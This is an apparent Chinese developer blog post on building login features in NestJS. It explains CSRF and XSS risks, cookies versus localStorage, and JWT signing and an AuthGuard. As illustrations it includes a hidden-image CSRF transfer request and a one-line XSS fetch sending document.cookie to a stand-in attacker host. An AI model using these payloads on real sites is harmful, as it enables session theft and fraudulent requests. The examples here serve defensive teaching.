![gh](https://raw.githubusercontent.com/penspulse326/penspulse326.github.io/images/17906836860000yxlyc.webp)

有了基本的 Google 登入功能，還要加入一些機制，整個會員功能才算完整！

---

## Cookie

以前在學校時可能會接收到「`cookie` 不安全，用 `localStorage`」的觀念，因為當時的瀏覽器還沒有普及 `SameSite` 的規範，所以很容易發生 CSRF 攻擊：

> 任何對於目標網站發送的請求，只要瀏覽器有同站的 cookie 就會自動帶上。

最簡單粗暴的方式就是在釣魚網站放一張隱藏圖片：

```html
<!-- 使用者點進惡意網站讀到這張圖片，瀏覽器就會自動帶著銀行的 cookie 發送這筆轉帳請求 -->
<img src="https://yourbank.com/api/transfer?to=hacker&amount=10000" />
```

（~~應該沒那麼蠢的 API，單純示範用~~）

現代瀏覽器將 `SameSite` 屬性作為 cookie 的統一標準後就提高不少安全性。

用 `localStorage` 存 token 反而不怎麼安全，因為一樣有簡單粗暴的腳本，可以發起 XSS 攻擊：

```js
// 駭客直接把使用者的 token 傳回自己的伺服器
fetch("https://evil-hacker.com/steal?data=" + document.cookie);
```

所以現在不太會拿 `localStorage` 存一些機敏資訊，大多是存一些 user setting。後端也會在 cookie 上設定 `HttpOnly`，將送往前端儲存的 cookie 鎖進瀏覽器程式的內部，前端就不能存取到 `document.cookie`，降低了風險性。

不過程式設計終究有漏洞，總是有一千零一種方法可以撬開盒子。不論是開發者或使用者，都要**好好把關自己的行為**！

---

## Guard

基本上 service 的部分沒什麼好討論的 XD 就是驗證該 Google 使用者是否註冊過、Google 資料完整性的檢查。

比較重要的是 service 中產生與驗證 token 的方法：

```ts
  signToken(user: { email: string; id: string; name: string }): string {
    const now = Math.floor(Date.now() / 1000);
    const payload: JwtPayload = {
      email: user.email,
      exp: now + 7 * 24 * 3600, // 7 days
      iat: now,
      name: user.name,
      sub: user.id,
    };

    const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
    const body = Buffer.from(JSON.stringify(payload)).toString('base64url');
    const signature = createHmac('sha256', this.jwtSecret)
      .update(`${header}.${body}`)
      .digest('base64url');

    return `${header}.${body}.${signature}`;
  }

  verifyToken(token: string): JwtPayload | null {
    try {
      const parts = token.split('.');
      if (parts.length !== 3) {
        return null;
      }
      const [header, body, signature] = parts;
      const expectedSignature = createHmac('sha256', this.jwtSecret)
        .update(`${header}.${body}`)
        .digest('base64url');

      if (signature !== expectedSignature) {
        return null;
      }

      const payload = JSON.parse(Buffer.from(body, 'base64url').toString('utf8')) as JwtPayload;
      if (payload.exp && Math.floor(Date.now() / 1000) > payload.exp) {
        return null;
      }

      return payload;
    } catch {
      return null;
    }
  }
```

應用程式啟動後就會將 `JWT_SECRET` 依賴注入到 `AuthService` 完成初始化，`AuthGuard` 會在收到請求時呼叫這個 service 的方法來執行驗證。

NestJS 提供了 guard 這個元件來幫助我們做職責分離，驗證使用者權限的流程就可以設計在 guard 中：

```ts
import type { Request } from "express";

import {
  type CanActivate,
  type ExecutionContext,
  Injectable,
  UnauthorizedException,
} from "@nestjs/common";

import type { AuthUser } from "../auth.types.ts";

import { AuthService } from "../auth.service.ts";

export interface AuthenticatedRequest extends Request {
  cookies?: Record<string, string>;
  user?: AuthUser | null;
}

@Injectable()
export class AuthGuard implements CanActivate {
  constructor(private readonly authService: AuthService) {}

  canActivate(context: ExecutionContext): boolean {
    const request = context.switchToHttp().getRequest<AuthenticatedRequest>();
    const authHeader = request.headers.authorization;

    let token: string | undefined;
    if (authHeader?.startsWith("Bearer ")) {
      token = authHeader.slice(7).trim();
    } else if (request.cookies?.access_token) {
      token = request.cookies.access_token;
    }

    if (!token) {
      throw new UnauthorizedException("Authentication token is required");
    }

    const payload = this.authService.verifyToken(token);
    if (!payload?.sub) {
      throw new UnauthorizedException("Token is invalid or expired");
    }

    request.user = {
      email: payload.email,
      id: payload.sub,
      name: payload.name,
    };

    return true;
  }
}
```

這樣設計的好處是只要任一功能需要驗證權限，就可以透過裝飾器語法掛在 controller 上：

```ts
  @Post()
  @UseGuards(AuthGuard)
  async createRecipe(
    @Body(new ZodValidationPipe(createRecipeSchema)) dto: CreateRecipeDto,
    @CurrentUser() user: AuthUser,
  ) {
    return await this.recipesService.create(dto, user.id);
  }

  @Get(':id')
  @UseGuards(OptionalAuthGuard)
  async getRecipe(
    @Param('id', new ZodValidationPipe(recipeIdSchema)) id: string,
    @CurrentUser() user?: AuthUser | null,
  ) {
    return await this.recipesService.findOne(id, user?.id);
  }
```

在 Express 中其實這些元件都是 middleware，只是透過 AOP 的觀念分離成各個具象功能。

---

## 小結

1. cookie 不是爛機制，`localStorage` 也沒有過時，只是要**理解各自的使用情境**
2. guard 元件**是一種 middleware**，不是黑魔法，當然所有東西都可以用 middleware 解釋，但我們選了 NestJS 的初衷就不是來造這種輪子的 XD
